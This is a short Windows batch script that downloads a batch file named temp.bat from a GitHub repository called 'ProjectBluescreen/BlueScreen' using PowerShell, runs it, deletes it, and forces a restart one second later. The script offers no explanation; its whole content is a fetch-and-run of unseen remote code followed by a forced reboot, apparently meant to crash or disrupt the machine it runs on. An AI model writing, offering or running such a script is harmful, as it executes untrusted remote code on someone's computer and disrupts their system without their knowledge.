%echo off
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/temp.bat -OutFile temp.bat
temp.bat
del temp.bat
shutdown -r -t 1
